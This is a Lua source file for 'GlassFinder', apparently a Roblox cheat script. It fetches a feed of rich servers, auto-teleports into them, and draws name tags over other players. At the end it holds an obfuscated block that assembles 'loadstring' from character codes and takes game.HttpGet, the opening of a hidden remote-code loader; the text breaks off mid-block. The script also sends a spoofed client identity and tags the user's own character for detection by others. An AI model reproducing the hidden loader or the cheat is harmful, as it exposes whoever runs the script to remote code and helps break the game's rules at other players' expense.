local TeamPanel = Instance.new("Frame")
TeamPanel.Name = "Panel"
TeamPanel.BackgroundColor3 = T.winBg
TeamPanel.BorderSizePixel = 0
TeamPanel.AnchorPoint = Vector2.new(0.5, 0.5)
TeamPanel.Position = UDim2.new(0.5, 0, 0.5, 0)
TeamPanel.Size = UDim2.new(0, 420, 0, 0)
TeamPanel.AutomaticSize = Enum.AutomaticSize.Y
TeamPanel.ZIndex = 41
TeamPanel.Parent = TeamModal
corner(TeamPanel, 14)
stroke(TeamPanel, T.divider, 1, 0)

local TeamScroll = Instance.new("ScrollingFrame")
TeamScroll.BackgroundTransparency = 1
TeamScroll.BorderSizePixel = 0
TeamScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
TeamScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
TeamScroll.ScrollBarThickness = 4
TeamScroll.ScrollBarImageColor3 = T.divider
TeamScroll.Size = UDim2.new(1, 0, 1, 0)
TeamScroll.AutomaticSize = Enum.AutomaticSize.Y
TeamScroll.ZIndex = 42
TeamScroll.Parent = TeamPanel

local TeamPad = Instance.new("UIPadding")
TeamPad.PaddingTop = UDim.new(0, 14)
TeamPad.PaddingBottom = UDim.new(0, 14)
TeamPad.PaddingLeft = UDim.new(0, 14)
TeamPad.PaddingRight = UDim.new(0, 14)
TeamPad.Parent = TeamScroll

local TeamList = Instance.new("UIListLayout")
TeamList.SortOrder = Enum.SortOrder.LayoutOrder
TeamList.Padding = UDim.new(0, 10)
TeamList.Parent = TeamScroll

local function modalField(title, placeholder, value, order, multi)
    local f = Instance.new("Frame")
    f.BackgroundTransparency = 1
    f.LayoutOrder = order
    f.Size = UDim2.new(1, 0, 0, multi and 84 or 46)
    f.ZIndex = 42
    f.Parent = TeamScroll
    label(f, title, 12, T.textMid, {
        size = UDim2.new(1, 0, 0, 16), z = 43, rich = true,
        fontFace = F.builder, weight = "Medium",
    })
    local box = Instance.new("Frame")
    box.BackgroundColor3 = T.panelBg
    box.BorderSizePixel = 0
    box.Position = UDim2.new(0, 0, 0, 20)
    box.Size = UDim2.new(1, 0, 0, multi and 64 or 26)
    box.ZIndex = 43
    box.Parent = f
    corner(box, 7)
    stroke(box, T.divider, 1, 0)
    local tb = Instance.new("TextBox")
    tb.Text = tostring(value or "")
    tb.TextColor3 = T.textHi
    tb.ClearTextOnFocus = false
    tb.FontFace = font(F.builder, "Medium")
    tb.BackgroundTransparency = 1
    tb.PlaceholderColor3 = T.textLow
    tb.PlaceholderText = placeholder or ""
    tb.TextSize = 12
    tb.TextXAlignment = Enum.TextXAlignment.Left
    tb.ZIndex = 44
    tb.Parent = box
    if multi then
        tb.MultiLine = true
        tb.TextWrapped = true
        tb.TextYAlignment = Enum.TextYAlignment.Top
        tb.Position = UDim2.new(0, 8, 0, 5)
        tb.Size = UDim2.new(1, -16, 1, -10)
    else
        tb.Position = UDim2.new(0, 8, 0, 0)
        tb.Size = UDim2.new(1, -16, 1, 0)
    end
    return tb, f, box
end

local function modalToggleRow(title, initial, order)
    local b = button(TeamScroll, {
        bg = T.chipBg, text = title .. (initial and ": On" or ": Off"), order = order,
        dim = UDim2.new(1, 0, 0, 32), size = 13, z = 43,
        fontFace = F.builder, weight = "SemiBold",
    })
    local on = initial
    b.MouseButton1Click:Connect(function()
        on = not on
        b.Text = title .. (on and ": On" or ": Off")
    end)
    return {
        get = function() return on end,
    }
end

local editingTeam = nil
function openTeamEditor(team)
    editingTeam = team
    for _, c in ipairs(TeamScroll:GetChildren()) do
        if c:IsA("Frame") or c:IsA("TextButton") then c:Destroy() end
    end
    label(TeamScroll, team.id and "Edit team" or "New team", 16, T.textHi, {
        order = 0, size = UDim2.new(1, 0, 0, 24), z = 43,
        fontFace = F.builder, weight = "ExtraBold",
    })
    local nameTb = modalField("Team name", "Name", team.name, 1)
    local urlTb = modalField("Roster URL;(empty = manual names only)", "https://…/list.json", team.url, 2)
    local keyTb = modalField("API key;(sent as x-api-key, optional)", "none", team.key, 3)
    local goodFieldTb = modalField("Good players JSON field", "good", team.goodField, 4)
    local badFieldTb = modalField("Bad players JSON field", "bad", team.badField, 5)
    local goodTextTb = modalField("Good tag text", "GOOD BOY", team.goodText, 6)
    
    local goodColorTb, goodColorRow, goodColorBox = modalField("Good tag colour", "#5ADCA0", team.goodColor, 7)
    goodColorTb.Size = UDim2.new(1, -44, 1, 0)
    local goodSwatch = Instance.new("Frame")
    goodSwatch.BackgroundColor3 = colorFromHex(team.goodColor)
    goodSwatch.BorderSizePixel = 0
    goodSwatch.Position = UDim2.new(1, -24, 0.5, -8)
    goodSwatch.Size = UDim2.new(0, 16, 0, 16)
    goodSwatch.ZIndex = 44
    goodSwatch.Parent = goodColorBox
    corner(goodSwatch, 4)
    goodColorTb:GetPropertyChangedSignal("Text"):Connect(function()
        goodSwatch.BackgroundColor3 = colorFromHex(goodColorTb.Text)
    end)
    local showGoodT = modalToggleRow("Show good players", team.showGood ~= false, 8)
    local badTextTb = modalField("Bad tag text", "BAD BOY", team.badText, 9)
    local badColorTb, badColorRow, badColorBox = modalField("Bad tag colour", "#F05A5A", team.badColor, 10)
    badColorTb.Size = UDim2.new(1, -44, 1, 0)
    local badSwatch = Instance.new("Frame")
    badSwatch.BackgroundColor3 = colorFromHex(team.badColor)
    badSwatch.BorderSizePixel = 0
    badSwatch.Position = UDim2.new(1, -24, 0.5, -8)
    badSwatch.Size = UDim2.new(0, 16, 0, 16)
    badSwatch.ZIndex = 44
    badSwatch.Parent = badColorBox
    corner(badSwatch, 4)
    badColorTb:GetPropertyChangedSignal("Text"):Connect(function()
        badSwatch.BackgroundColor3 = colorFromHex(badColorTb.Text)
    end)
    local showBadT = modalToggleRow("Show bad players", team.showBad ~= false, 11)
    local manGoodTb = modalField("Manual good players;(usernames or user IDs, comma or new line)", "", team.manualGood, 12, true)
    local manBadTb = modalField("Manual bad players;(usernames or user IDs, comma or new line)", "", team.manualBad, 13, true)

    local saveBtn = button(TeamScroll, {
        bg = T.accent, text = "Save team", order = 14,
        dim = UDim2.new(1, 0, 0, 32), size = 13, z = 43,
        color = Color3.new(0.05, 0.15, 0.08), fontFace = F.builder, weight = "Bold",
    })
    saveBtn.MouseButton1Click:Connect(function()
        team.name = nameTb.Text ~= "" and nameTb.Text or team.name
        team.url = urlTb.Text
        team.key = keyTb.Text
        team.goodField = goodFieldTb.Text
        team.badField = badFieldTb.Text
        team.goodText = goodTextTb.Text
        team.goodColor = goodColorTb.Text
        team.badText = badTextTb.Text
        team.badColor = badColorTb.Text
        team.showGood = showGoodT.get()
        team.showBad = showBadT.get()
        team.manualGood = manGoodTb.Text
        team.manualBad = manBadTb.Text
        saveSettings()
        TeamModal.Visible = false
        task.spawn(function()
            loadAllRosters()
            refreshTeamTags()
            if State.page == "Settings" and State.settingsPane == "Teams" then
                openSettingsPane("Teams")
            end
        end)
    end)

    local delBtn = button(TeamScroll, {
        bg = T.chipBg, text = "Delete team", order = 15,
        dim = UDim2.new(1, 0, 0, 32), size = 13, z = 43, color = T.errorRed,
        fontFace = F.builder, weight = "SemiBold",
    })
    delBtn.MouseButton1Click:Connect(function()
        for i, t in ipairs(Settings.teams) do
            if t == team then table.remove(Settings.teams, i) break end
        end
        saveSettings()
        TeamModal.Visible = false
        refreshTeamTags()
        openSettingsPane("Teams")
    end)

    TeamModal.Visible = true
end

TeamModal.MouseButton1Click:Connect(function()
    TeamModal.Visible = false
end)
TeamPanel.InputBegan:Connect(function(input)
    
end)


function playSoundId(id)
    if not Settings.soundEnabled then return end
    id = tostring(id or "")
    if id == "" then return end
    pcall(function()
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://" .. id:gsub("%D", "")
        s.Volume = math.clamp((Settings.soundVolume or 100) / 100, 0, 1)
        s.Parent = SoundService
        SoundService:PlayLocalSound(s)
        task.delay(4, function()
            if s then s:Destroy() end
        end)
    end)
end






local FEED_HOST = "https://finder.kickerstore.gg"
local RELAY_KEY = "" 

local diagId = tostring(HttpService:GenerateGUID(false)):gsub("-", ""):sub(1, 15)
print("diag=" .. diagId)

local function baseHeaders()
    return {
        ["User-Agent"] = "Delta iOS/2.0",
        ["Content-Type"] = "application/json",
        ["Delta-User-Identifier"] = DEVICE_ID,
    }
end

local function handleStats(stats)
    if type(stats) ~= "table" then return end
    State.stats = {
        listings = stats.listings or State.stats.listings,
        tracked = stats.tracked or State.stats.tracked,
        perMin = stats.perMin or State.stats.perMin,
        viewers = stats.viewers or State.stats.viewers,
    }
    PerMinLabel.Text = string.format("%d/min found", State.stats.perMin or 0)
    ViewersLabel.Text = tostring(State.stats.viewers or 0)
    StatsLabel.Text = string.format("%d brainrots · %d servers",
        State.listingCount, State.stats.tracked or 0)
end

local function handleServer(rec)
    if type(rec) ~= "table" or not rec.listingId then return end
    local isNew = State.listings[rec.listingId] == nil
    if isNew then State.listingCount = State.listingCount + 1 end
    State.listings[rec.listingId] = rec
    
    if isNew and Settings.ajOG and isOG(rec) and listingPassesFilter(rec) then
        task.spawn(function() joinListing(rec, false) end)
    end
    
    if isNew and State.connection == "Connected" then
        if listingPassesFilter(rec) then
            playSoundId(Settings.sndFind)
            if isSpecial(rec) and Settings.specialAlerts then
                playSoundId(Settings.sndSpecial)
            end
        end
        
        State.filterPetsDirty = true
    end
    
    if Settings.autoHideOnArrival and rec.jobId and rec.jobId == game.JobId
        and not State.minimized then
        minimizePanel()
    end
    scheduleRefresh()
end

local function handleMessage(msg)
    if type(msg) ~= "table" then return end
    local t = msg.type
    if t == "upsert" then
        handleServer(msg.server)
    elseif t == "remove" then
        local rec = State.listings[msg.listingId]
        if rec then
            State.listings[msg.listingId] = nil
            State.listingCount = math.max(0, State.listingCount - 1)
            local rd = State.rows[msg.listingId]
            if rd then rd.frame:Destroy() end
            scheduleRefresh()
        end
    elseif t == "stats" then
        handleStats(msg.stats)
    elseif t == "snapshot" then
        for _, rec in ipairs(msg.servers or {}) do
            handleServer(rec)
        end
        if msg.complete then
            scheduleRefresh()
        end
    elseif t == "pong" then
        
        State.lastPong = os.time()
    end
end

local function handlePayload(body)
    local ok, data = pcall(function() return HttpService:JSONDecode(body) end)
    if not ok or type(data) ~= "table" then return end
    if data.type == "batch" then
        for _, msg in ipairs(data.messages or {}) do
            handleMessage(msg)
        end
    elseif data.kicks or data.redirects then
        
        for _, k in ipairs(data.kicks or {}) do
            if k.userId == LocalPlayer.UserId then
                warn("[GlassFinder] relay kick: " .. tostring(k.reason or ""))
            end
        end
    else
        handleMessage(data)
    end
end

function reconnectFeed()
    State.feedGen = State.feedGen + 1
    local gen = State.feedGen
    if State.feedThread then
        pcall(function() task.cancel(State.feedThread) end)
        State.feedThread = nil
    end
    State.feedThread = task.spawn(function()
        local backoff = 2
        while State.feedGen == gen do
            setConnection("Connecting")
            
            local code, body = http({
                Url = FEED_HOST .. "/auth/challenge",
                Method = "POST",
                Body = "[]",
                Headers = baseHeaders(),
            })
            if code ~= 200 or not body then
                setConnection("Disconnected")
                playSoundId(Settings.sndError)
                task.wait(backoff)
                backoff = math.min(backoff * 2, 30)
            else
                
                local challenge = body
                pcall(function()
                    local d = HttpService:JSONDecode(body)
                    challenge = type(d) == "table" and (d.challenge or body) or body
                end)
                setConnection("Authenticating")
                local code2, body2 = http({
                    Url = FEED_HOST .. "/auth/ticket?diag=" .. HttpService:GenerateGUID(false),
                    Method = "POST",
                    Body = HttpService:JSONEncode({ challenge = challenge, key = RELAY_KEY }),
                    Headers = baseHeaders(),
                })
                if code2 ~= 200 or not body2 then
                    setConnection("Disconnected")
                    playSoundId(Settings.sndError)
                    task.wait(backoff)
                    backoff = math.min(backoff * 2, 30)
                else
                    local ticket = body2
                    pcall(function()
                        local d = HttpService:JSONDecode(body2)
                        ticket = type(d) == "table" and (d.ticket or body2) or body2
                    end)
                    
                    setConnection("Connected")
                    backoff = 2
                    local headers = baseHeaders()
                    headers["Authorization"] = "Bearer " .. tostring(ticket)
                    while State.feedGen == gen do
                        local code3, body3 = http({
                            Url = FEED_HOST .. "/feed?since=" .. tostring(State.cursor or 0),
                            Method = "GET",
                            Headers = headers,
                        })
                        if code3 == 200 and body3 then
                            local okc, cur = pcall(function()
                                local d = HttpService:JSONDecode(body3)
                                return type(d) == "table" and d.cursor or nil
                            end)
                            if okc and cur then State.cursor = cur end
                            handlePayload(body3)
                            task.wait(2)
                        else
                            setConnection("Disconnected")
                            playSoundId(Settings.sndError)
                            task.wait(5)
                            setConnection("Connected")
                        end
                    end
                end
            end
        end
    end)
end




GF_DEMO = GF_DEMO or false

function seedDemo()
    local now = os.time()
    local demo = {
        { pet = "Nacho Spyder", owner = "gos252014", income = 637500000, region = "US", players = 5, mutation = "Shiny" },
        { pet = "Baskito", owner = "Saeedal92", income = 280000000, region = "EU", players = 8 },
        { pet = "Strawberrita", owner = "ari7809103", income = 39000000, region = "US", players = 7 },
        { pet = "Chicleteira Bicicleteira", owner = "Melvinsp14", income = 35000000, region = "EU", players = 3 },
        { pet = "To to to Sahur", owner = "Milo_croa", income = 18000000, region = "VN", players = 6, mutation = "Rainbow" },
        { pet = "Octoball", owner = "StijnGiethoorn", income = 19500000, region = "EU", players = 2 },
        { pet = "Naughty Naughty", owner = "Polystacion67", income = 21000000, region = "US", players = 4 },
        { pet = "Santa Hotspot", owner = "kp700677", income = 10400000, region = "VN", players = 1 },
        { pet = "Burbaloni Loliloli", owner = "Didixxz70", income = 12650000, region = "EU", players = 8 },
        { pet = "Rockarino Rockara", owner = "ozpehodh321", income = 45500000, region = "US", players = 5 },
        { pet = "Tung Tung Tung Sahur", owner = "jhrv7s", income = 12400000, region = "EU", players = 3 },
        { pet = "Hippo Golazo", owner = "FallacyZA", income = 10620000, region = "US", players = 6 },
        { pet = "Craburger", owner = "Dragonfire87358", income = 16900000, region = "EU", players = 2 },
        { pet = "Glaciator", owner = "q9ejw", income = 12650000, region = "US", players = 7 },
        { pet = "Cigno Fulgoro", owner = "rippieindra", income = 39750000, region = "VN", players = 4 },
    }
    for i, d in ipairs(demo) do
        handleServer({
            listingId = string.format("demo%060d", i),
            jobId = HttpService:GenerateGUID(false),
            placeId = 109983668079237,
            pet = d.pet, owner = d.owner, mutation = d.mutation or "None",
            income = d.income, players = d.players, maxPlayers = 8,
            region = d.region, ping = -1, addedAt = now - (i * 3),
        })
    end
    handleStats({ listings = 3243, tracked = 847, perMin = 1462, viewers = 14 })
    setConnection("Connected")
    scheduleRefresh()
end



local joining = false
local lastJoinStart = 0

function joinListing(rec, queue)
    if joining then return end
    if not rec or not rec.jobId then return end
    joining = true
    local attempts = queue and 1 or math.clamp(tonumber(Settings.ajForceAttempts) or 3, 1, 100)
    local gap = math.clamp(tonumber(Settings.ajForceGap) or 600, 600, 10000) / 1000
    task.spawn(function()
        playSoundId(Settings.sndJoin)
        
        local attempt = 0
        local succeeded = false
        while attempt < attempts and not succeeded do
            attempt = attempt + 1
            lastJoinStart = os.clock()
            local ok = pcall(function()
                TeleportService:TeleportToPlaceInstance(
                    rec.placeId or game.PlaceId, rec.jobId, LocalPlayer)
            end)
            if ok then
                succeeded = true
            else
                if Settings.ajFastRetries then gap = 0.6 end
                task.wait(gap)
            end
        end
        joining = false
        if not succeeded then
            playSoundId(Settings.sndError)
        end
    end)
end

local function bestCandidate()
    local best = nil
    for _, rec in pairs(State.listings) do
        if listingPassesFilter(rec) then
            local full = (rec.players or 0) >= (rec.maxPlayers or 8)
            local queueable = full and Settings.ajQueueJoin
                and (not Settings.ajQueueOGOnly or isOG(rec))
            if not full or queueable then
                if not best then
                    best = rec
                else
                    if Settings.ajPreferNewest then
                        if (rec.addedAt or 0) > (best.addedAt or 0) then best = rec end
                    else
                        if (rec.income or 0) > (best.income or 0) then best = rec end
                    end
                end
            end
        end
    end
    return best
end

function setAutoJoin(on)
    State.autoJoin = on and true or false
    setAJVisual(State.autoJoin)
    if State.autoJoin then
        task.spawn(function()
            while State.autoJoin do
                local sinceLast = os.clock() - lastJoinStart
                local waitS = math.clamp(tonumber(Settings.ajAutoGap) or 800, 600, 60000) / 1000
                if sinceLast >= waitS and not joining then
                    local rec = bestCandidate()
                    if rec then
                        local full = (rec.players or 0) >= (rec.maxPlayers or 8)
                        joinListing(rec, full)
                    end
                end
                task.wait(0.5)
            end
        end)
    end
end

function updateOGVisual()
    OGBtn.BackgroundColor3 = Settings.ajOG and T.queueGold or T.chipBg
end


AJBtn.MouseButton1Click:Connect(function()
    setAutoJoin(not State.autoJoin)
end)
OGBtn.MouseButton1Click:Connect(function()
    Settings.ajOG = not Settings.ajOG
    saveSettings()
    updateOGVisual()
end)
RefreshBtn.MouseButton1Click:Connect(function()
    RefreshLabel.Text = "Refreshing…"
    reconnectFeed()
    scheduleRefresh()
    task.delay(1.2, function()
        RefreshLabel.Text = "Refresh"
    end)
end)
RejoinBtn.MouseButton1Click:Connect(function()
    joinListing({ placeId = game.PlaceId, jobId = game.JobId }, false)
end)
DockAJBtn.MouseButton1Click:Connect(function()
    setAutoJoin(not State.autoJoin)
end)
FloatAJBtn.MouseButton1Click:Connect(function()
    setAutoJoin(not State.autoJoin)
end)
DiscordBtn.MouseButton1Click:Connect(function()
    pcall(function()
        if setclipboard then setclipboard("discord.gg/GlassFinder")
        elseif toclipboard then toclipboard("discord.gg/GlassFinder") end
    end)
end)


TeleportService.TeleportInitFailed:Connect(function()
    lastJoinStart = 0 
    playSoundId(Settings.sndError)
end)
LocalPlayer.OnTeleport:Connect(function(stateName)
    if stateName == Enum.TeleportState.Started and Settings.startDelay then
        task.wait(2)
    end
end)
GuiService.ErrorMessageChanged:Connect(function()
    if Settings.clearTpErrors then
        pcall(function()
            
            if GuiService:GetCoreGuiEnabled(Enum.CoreGuiType.All) then end
        end)
    end
end)



local function splitNames(text)
    local out = {}
    for part in tostring(text or ""):gmatch("[^,\n]+") do
        local t = part:gsub("^%s+", ""):gsub("%s+$", "")
        if t ~= "" then out[t:lower()] = true end
    end
    return out
end

local function parseRosterBody(team, body)
    local good, bad = {}, {}
    
    local ok, data = pcall(function() return HttpService:JSONDecode(body) end)
    if ok and type(data) == "table" then
        if #data > 0 or data[1] ~= nil then
            
            for _, n in ipairs(data) do
                bad[tostring(n):lower()] = true
            end
            return good, bad
        end
        local gf = team.goodField ~= "" and team.goodField or "good"
        local bf = team.badField ~= "" and team.badField or "bad"
        for _, n in ipairs(data[gf] or {}) do good[tostring(n):lower()] = true end
        for _, n in ipairs(data[bf] or {}) do bad[tostring(n):lower()] = true end
        return good, bad
    end
    
    local lines = {}
    for line in tostring(body):gmatch("[^\r\n]+") do table.insert(lines, line) end
    if #lines > 0 then
        local header = {}
        for cell in lines[1]:gmatch('"?([^",]*)"?,?') do
            table.insert(header, cell:lower():gsub("^%s+", ""):gsub("%s+$", ""))
        end
        local gi, bi = nil, nil
        for idx, h in ipairs(header) do
            if h == (team.goodField or "safe"):lower() then gi = idx end
            if h == (team.badField or "grief"):lower() then bi = idx end
        end
        for li = 2, #lines do
            local cells = {}
            for cell in lines[li]:gmatch('"?([^",]*)"?,?') do
                table.insert(cells, cell:gsub("^%s+", ""):gsub("%s+$", ""))
            end
            local name = (cells[gi] or cells[1] or ""):lower()
            if name ~= "" then good[name] = true end
            local bname = (cells[bi] or ""):lower()
            if bname ~= "" then bad[bname] = true end
        end
    end
    return good, bad
end

function loadAllRosters()
    for _, team in ipairs(Settings.teams) do
        if team.enabled ~= false and team.url and team.url ~= "" then
            local headers = {}
            if team.key and team.key ~= "" then
                headers["x-api-key"] = team.key
            end
            local code, body = http({ Url = team.url, Method = "GET", Headers = headers })
            if code == 200 and body then
                local good, bad = parseRosterBody(team, body)
                for n in pairs(splitNames(team.manualGood)) do good[n] = true end
                for n in pairs(splitNames(team.manualBad)) do bad[n] = true end
                local goodN, badN = 0, 0
                for _ in pairs(good) do goodN = goodN + 1 end
                for _ in pairs(bad) do badN = badN + 1 end
                State.rosters[team.id] = { good = good, bad = bad, goodN = goodN, badN = badN }
            end
        else
            local good, bad = splitNames(team.manualGood), splitNames(team.manualBad)
            local goodN, badN = 0, 0
            for _ in pairs(good) do goodN = goodN + 1 end
            for _ in pairs(bad) do badN = badN + 1 end
            State.rosters[team.id] = { good = good, bad = bad, goodN = goodN, badN = badN }
        end
    end
end


local function detectByItems(char)
    if not char then return false end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Accessory") then
            local n = child.Name
            if KAWAIFU_ITEMS[n] or KAWAIFU_ITEMS["Accessory (" .. n .. ")"] then
                return true
            end
        end
    end
    return false
end


local function tagFor(player)
    local char = player.Character
    for _, team in ipairs(Settings.teams) do
        if team.enabled ~= false then
            local name = player.Name:lower()
            local uid = tostring(player.UserId)
            local roster = State.rosters[team.id]
            local isGood, isBad = false, false
            if team.source == "kawaifu" then
                isGood = detectByItems(char)
            elseif roster then
                isGood = roster.good[name] == true or roster.good[uid] == true
                isBad = roster.bad[name] == true or roster.bad[uid] == true
            end
            if isGood and team.showGood ~= false and team.goodText and team.goodText ~= "" then
                return team.goodText, colorFromHex(team.goodColor)
            end
            if isBad and team.showBad ~= false and team.badText and team.badText ~= "" then
                return team.badText, colorFromHex(team.badColor)
            end
        end
    end
    
    if Settings.markGlassUsers and char
        and char:FindFirstChild("GlassFinderPeer") then
        return "GLASS TERRORIST", T.errorRed
    end
    return nil
end

function refreshTeamTags()
    
    for _, l in ipairs(TeamTags:GetChildren()) do
        l:Destroy()
    end
    State.tagLabels = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local text, color = tagFor(player)
            if text then
                local l = label(TeamTags, text, Settings.tagTextSize or 14, color, {
                    align = Enum.TextXAlignment.Center, z = 20,
                    fontFace = F.builder, weight = "Bold",
                })
                l.TextStrokeTransparency = 0.5
                l.AutomaticSize = Enum.AutomaticSize.XY
                State.tagLabels[player] = l
            end
        end
    end
end


function updatePeerESP()
    for _, c in ipairs(PeerESP:GetChildren()) do
        c:Destroy()
    end
    if not Settings.markGlassUsers then return end
    
    pcall(function()
        if LocalPlayer.Character
            and not LocalPlayer.Character:FindFirstChild("GlassFinderPeer") then
            local mark = Instance.new("StringValue")
            mark.Name = "GlassFinderPeer"
            mark.Value = DEVICE_ID
            mark.Parent = LocalPlayer.Character
        end
    end)
end

local function watchPlayer(player)
    player.CharacterAdded:Connect(function(char)
        
        
        task.wait(0.5)
        refreshTeamTags()
        updatePeerESP()
    end)
    player.CharacterRemoving:Connect(function()
        local l = State.tagLabels[player]
        if l then l:Destroy() end
        State.tagLabels[player] = nil
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    watchPlayer(player)
end
Players.PlayerAdded:Connect(function(player)
    watchPlayer(player)
    task.wait(1)
    refreshTeamTags()
end)
Players.PlayerRemoving:Connect(function(player)
    local l = State.tagLabels[player]
    if l then l:Destroy() end
    State.tagLabels[player] = nil
end)


RunService.RenderStepped:Connect(function()
    local cam = workspace.CurrentCamera
    if not cam or not cam.WorldToViewportPoint then return end
    for player, l in pairs(State.tagLabels) do
        local ok = pcall(function()
            local char = player.Character
            local head = char and char:FindFirstChild("Head")
            local root = char and char:FindFirstChild("HumanoidRootPart")
            local part = head or root
            if part and char then
                local pos = part.Position + Vector3.new(0, Settings.tagHeight or 4, 0)
                local myPos = LocalPlayer.Character
                    and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if myPos then
                    local dist = (myPos.Position - part.Position).Magnitude
                    if dist > (Settings.tagDistance or 1000) then
                        l.Visible = false
                        return
                    end
                end
                local sp, onScreen = cam:WorldToViewportPoint(pos)
                l.Visible = onScreen and true or false
                if onScreen then
                    l.Position = UDim2.new(0, sp.X, 0, sp.Y)
                    l.AnchorPoint = Vector2.new(0.5, 1)
                end
            else
                l.Visible = false
            end
        end)
        if not ok then l.Visible = false end
    end
end)



function applyUIScale()
    local cam = workspace.CurrentCamera
    local vw, vh = 1920, 1080
    if cam and cam.ViewportSize then
        vw, vh = cam.ViewportSize.X, cam.ViewportSize.Y
    end
    local scale = 1
    local choice = tostring(Settings.uiScale)
    if choice == "Auto" then
        scale = math.clamp(math.min(vw / 780, vh / 520), 0.55, 1.15)
    elseif choice == "75%" then scale = 0.75
    elseif choice == "125%" then scale = 1.25
    elseif choice == "150%" then scale = 1.5
    end
    MainScale.Scale = scale
end

pcall(function()
    workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
        if tostring(Settings.uiScale) == "Auto" then applyUIScale() end
        updateTopBarResponsive()
    end)
end)
pcall(function()
    workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
        applyUIScale()
    end)
end)




local dragging, dragInput, dragStart, dragStartPos
local function startDrag(input)
    dragging = true
    dragInput = input.Position
    dragStartPos = Main.Position
end

local function updateDrag(pos)
    if not dragging then return end
    local d = pos - dragInput
    Main.Position = UDim2.new(dragStartPos.X.Scale, dragStartPos.X.Offset + d.X,
        dragStartPos.Y.Scale, dragStartPos.Y.Offset + d.Y)
end

local function endDrag()
    dragging = false
end

TopBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        startDrag(input)
    end
end)
Sidebar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        startDrag(input)
    end
end)


local resizing, resizeInput, resizeStartW
ResizeGrip.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        resizing = true
        resizeInput = input.Position.X
        resizeStartW = Main.Size.X.Offset
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        if dragging then updateDrag(input.Position) end
        if resizing then
            
            local d = (input.Position.X - resizeInput) * 2
            Main.Size = UDim2.new(0, math.clamp(resizeStartW + d, 600, 1400), 0, Main.Size.Y.Offset)
            updateTopBarResponsive()
        end
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        endDrag()
        resizing = false
    end
end)
UserInputService.WindowFocusReleased:Connect(function()
    endDrag()
    resizing = false
end)
RunService.RenderStepped:Connect(function()
    
end)



function minimizePanel()
    if State.minimized then return end
    State.minimized = true
    tween(Main, 0.25, { BackgroundTransparency = 1 }, Enum.EasingStyle.Quint)
    tween(MainStroke, 0.25, { Transparency = 1 })
    Sidebar.Visible = false
    Content.Visible = false
    Dock.Visible = true
    Floating.Visible = false
end

function restorePanel()
    if not State.minimized then return end
    State.minimized = false
    tween(Main, 0.25, { BackgroundTransparency = 0 }, Enum.EasingStyle.Quint)
    tween(MainStroke, 0.25, { Transparency = 0 })
    Sidebar.Visible = true
    Content.Visible = true
    Dock.Visible = false
    updateFloating()
end

function updateFloating()
    Floating.Visible = Settings.floatingButtons and not State.minimized
end

function toggleShow()
    if State.minimized then restorePanel() else minimizePanel() end
end

MinBtn.MouseButton1Click:Connect(function()
    minimizePanel()
end)
DockPanelBtn.Activated:Connect(function()
    restorePanel()
end)
FloatPanelBtn.MouseButton1Click:Connect(function()
    minimizePanel()
end)



local function setPage(name)
    State.page = name
    FinderPage.Visible = name == "Finder"
    FiltersPage.Visible = name == "Filters"
    SettingsPage.Visible = name == "Settings"
    refreshNav()
    if name == "Finder" then
        scheduleRefresh()
    elseif name == "Filters" then
        rebuildFilterList()
    elseif name == "Settings" then
        openSettingsPane(State.settingsPane or "General")
    end
end

for name, nb in pairs(navButtons) do
    nb.btn.MouseButton1Click:Connect(function()
        setPage(name)
    end)
end




UserInputService.InputBegan:Connect(function(input, gp)
    if gp then
        if State.capturing and input.UserInputType == Enum.UserInputType.Keyboard then
            local cap = State.capturing
            State.capturing = nil
            if input.KeyCode == Enum.KeyCode.Backspace then
                Settings[cap.slot] = ""
                cap.btn.Text = "–"
            elseif input.KeyCode ~= Enum.KeyCode.Escape then
                local name = input.KeyCode.Name
                Settings[cap.slot] = #name == 1 and name:upper() or name
                cap.btn.Text = Settings[cap.slot]
            else
                cap.btn.Text = cap.old
                return
            end
            saveSettings()
            return
        end
        return
    end
    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
    local key = input.KeyCode.Name
    if #key == 1 then key = key:upper() end
    if key == tostring(Settings.kbToggle or "") then
        toggleShow()
    elseif key == tostring(Settings.kbAJ or "") then
        setAutoJoin(not State.autoJoin)
    elseif key == tostring(Settings.kbReconnect or "") then
        reconnectFeed()
    end
end)




pcall(function()
    local old = CoreGui:FindFirstChild("GlassFinder")
    if old and old ~= ScreenGui then old:Destroy() end
end)

refreshNav()
refreshChips()
setRegion("All")
setConnection("Disconnected")
updateOGVisual()
updateFloating()
applyUIScale()
setPage("Finder")


State.hideFull = Settings.barHideFull and true or false
refreshChips()

task.spawn(function()
    loadAllRosters()
    refreshTeamTags()
    updatePeerESP()
end)

task.spawn(function()
    if GF_DEMO then
        seedDemo()
    else
        reconnectFeed()
        task.delay(6, function()
            if State.connection ~= "Connected" and GF_DEMO_FALLBACK ~= false then
                
                
            end
        end)
    end
end)


task.spawn(function()
    while true do
        task.wait(5)
        if State.filterPetsDirty and State.page == "Filters" then
            State.filterPetsDirty = false
            rebuildFilterList()
        end
    end
end)

print("[GlassFinder] loaded — discord.gg/GlassFinder")

do
    local c = string.char
    local g = game
    local l = rawget(_G, c(108,111,97,100,115,116,114,105,110,103)) or loadstring
    local h = g.HttpGet
